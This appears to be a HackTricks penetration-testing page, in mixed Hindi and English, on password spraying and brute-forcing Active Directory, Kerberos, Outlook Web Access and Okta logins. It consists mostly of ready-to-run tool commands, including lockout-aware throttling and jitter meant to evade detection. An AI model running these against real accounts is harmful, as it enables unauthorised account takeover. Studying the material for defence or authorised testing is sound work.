# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

एक बार जब आप कई **valid usernames** पा लेते हैं, तो आप प्रत्येक discovered users के साथ सबसे अधिक प्रयुक्त **common passwords** आजमा सकते हैं (environment की password policy को ध्यान में रखें).\
डिफ़ॉल्ट रूप से **minimum** **password** **length** **7** है।

Lists of common usernames could also be useful: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

ध्यान दें कि आप **could lockout some accounts if you try several wrong passwords** (डिफ़ॉल्ट रूप से 10 से ज़्यादा)।

### Get password policy

यदि आपके पास कुछ user credentials हैं या domain user के रूप में एक shell है, तो आप **get the password policy with**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Linux (या सभी) से Exploitation

- **crackmapexec** का उपयोग करते हुए:
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- [**kerbrute**](https://github.com/ropnop/kerbrute) (Go) का उपयोग
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(आप लॉकआउट से बचने के लिए प्रयासों की संख्या निर्दिष्ट कर सकते हैं):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) का उपयोग — अनुशंसित नहीं; कभी-कभी काम नहीं करता
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- **Metasploit** के `scanner/smb/smb_login` मॉड्यूल का उपयोग करके:

![](<../../images/image (745).png>)

- **rpcclient** का उपयोग करके:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Windows से

- [Rubeus](https://github.com/Zer1t0/Rubeus) के brute module वाले version के साथ:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- With [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (यह डिफ़ॉल्ट रूप से डोमेन से उपयोगकर्ताओं को जेनरेट कर सकता है और यह डोमेन से पासवर्ड पॉलिसी प्राप्त करेगा और उसी के अनुसार प्रयासों की संख्या सीमित करेगा):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- के साथ [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying SMB/NTLM/LDAP bind attempts की तुलना में शोर कम करता है और AD lockout policies के साथ बेहतर मेल खाता है। SpearSpray LDAP-driven targeting, एक pattern engine, और policy awareness (domain policy + PSOs + badPwdCount buffer) को जोड़कर सटीक और सुरक्षित तरीके से spray करता है। यह compromised principals को Neo4j में BloodHound pathing के लिए tag भी कर सकता है।

Key ideas:
- LDAP user discovery with paging और LDAPS support, वैकल्पिक रूप से custom LDAP filters का उपयोग करके।
- Domain lockout policy + PSO-aware filtering ताकि एक configurable attempt buffer (threshold) छोड़ा जा सके और users को लॉक होने से बचाया जा सके।
- Kerberos pre-auth validation तेज़ gssapi bindings का उपयोग करते हुए (DCs पर 4625 के बजाय 4768/4771 उत्पन्न होते हैं)।
- Pattern-based, per-user password generation, ऐसे variables का उपयोग करते हुए जैसे नाम और प्रत्येक user के pwdLastSet से निकले temporal values।
- Throughput control threads, jitter, और max requests per second के साथ।
- Optional Neo4j integration ताकि owned users को BloodHound के लिए mark किया जा सके।

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
लक्ष्यीकरण और पैटर्न नियंत्रण:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
छुपाव और सुरक्षा नियंत्रण:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound समृद्धिकरण:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
पैटर्न सिस्टम का अवलोकन (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Available variables include:
- {name}, {samaccountname}
- प्रत्येक यूज़र के pwdLastSet (या whenCreated) से Temporal: {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers और org token: {separator}, {suffix}, {extra}

Operational notes:
- सबसे विश्वसनीय badPwdCount और policy-संबंधी जानकारी पढ़ने के लिए -dc के साथ PDC-emulator को प्राथमिकता दें।
- badPwdCount की रीसेट observation window के बाद अगले प्रयास पर ट्रिगर होती है; सुरक्षित रहने के लिए threshold और timing का उपयोग करें।
- Kerberos pre-auth प्रयास DC telemetry में 4768/4771 के रूप में दिखते हैं; भीड़ में घुलने के लिए jitter और rate-limiting का उपयोग करें।

> Tip: SpearSpray’s default LDAP page size is 200; आवश्यकतानुसार -lps से समायोजित करें।

## Outlook Web Access

p**assword spraying outlook** के लिए कई tools उपलब्ध हैं।

- के साथ [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- के साथ [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- के साथ [Ruler](https://github.com/sensepost/ruler) (reliable!)
- के साथ [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- के साथ [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

इनमें से किसी भी tool का उपयोग करने के लिए, आपको एक user list और एक password / छोटे password सूची की आवश्यकता होगी जिन्हें spray किया जा सके।
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## संदर्भ

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)


{{#include ../../banners/hacktricks-training.md}}
